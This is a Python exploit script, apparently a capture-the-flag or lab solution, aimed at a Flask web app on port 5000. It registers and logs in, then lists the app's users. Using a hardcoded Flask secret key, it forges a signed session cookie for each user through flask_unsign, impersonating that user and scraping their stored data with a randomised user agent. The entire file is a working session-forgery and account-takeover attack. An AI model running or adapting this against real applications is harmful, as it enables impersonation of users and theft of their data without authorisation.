#!/usr/bin/python

from random_username.generate import generate_username
from fake_useragent import UserAgent
from requests import Session
from flask_unsign import session as flask_session
from string import ascii_letters, digits
from random import choices
from bs4 import BeautifulSoup
from sys import argv, settrace

USERNAME = generate_username(1)[0]
PASSWORD = ''.join(choices(ascii_letters + digits, k=8))
USER_AGENT = UserAgent().random
SECRET_KEY = 'y0u-w1ll-n3v3r-gu355'


def retrieve_csrf_token(s: Session, url: str) -> str:
    data = s.get(url).text
    soup = BeautifulSoup(data, 'html.parser')
    print(f'[+] Retrieved csrf_token from {url}')
    return soup.find(attrs={'id': 'csrf_token'})['value']


def register(s: Session, url: str) -> None:
    url += '/register'
    csrf_token = retrieve_csrf_token(s, url)
    s.post(url, data={
        'csrf_token': csrf_token,
        'username': USERNAME,
        'password': PASSWORD,
        'submit': 'Submit'
    })
    print('[+] Registered')


def login(s: Session, url: str) -> None:
    url += '/login'
    csrf_token = retrieve_csrf_token(s, url)
    s.post(url, data={
        'csrf_token': csrf_token,
        'username': USERNAME,
        'password': PASSWORD,
        'submit': 'Submit'
    })
    print('[+] Logged in')


def retrieve_users(s: Session, url: str) -> list:
    url += '/users'
    data = s.get(url).text
    soup = BeautifulSoup(data, 'html.parser')
    print(f'[+] Retrieved users')
    return [user.text for user in soup.find_all(attrs={'scope': 'row'})]


def update_session(s: Session, url: str, user_id: str):
    session = flask_session.decode(value=s.cookies.get('session'))
    session['_user_id'] = user_id
    s.cookies.set('session', flask_session.sign(
        value=session,
        secret=SECRET_KEY,
        salt='cookie-session',
        legacy=False
    ), domain=argv[1])


def retrieve_cookie_links(s: Session, url: str) -> list:
    url += '/dashboard'
    data = s.get(url).text
    soup = BeautifulSoup(data, 'html.parser')
    print(f'[+] Retrieved cookie links')
    return [link['href'] for link in soup.find_all(attrs={'class': 'card-link'})]


def retrieve_cookies(s: Session, url: str) -> list:
    links = retrieve_cookie_links(s, url)
    cookies = []
    for link in links:
        data = s.get(url + link).text
        soup = BeautifulSoup(data, 'html.parser')
        cookie_name = soup.find(attrs={'class': 'display-6'}).get_text()
        cookie_value = soup.find(attrs={'class': 'lead'}).get_text()
        cookies.append({cookie_name: cookie_value})
    print(f'[+] Retrieved cookies')
    return cookies


def main() -> None:
    try:
        url = f'http://{argv[1]}:5000'
        s = Session()
        s.headers['User-Agent'] = USER_AGENT
        register(s, url)
        login(s, url)
        users = retrieve_users(s, url)
        for user_id in users:
            update_session(s, url, user_id)
            cookies = retrieve_cookies(s, url)
            print(cookies)
    except:
        print('[-] Something went wrong')


if __name__ == '__main__':
    main()
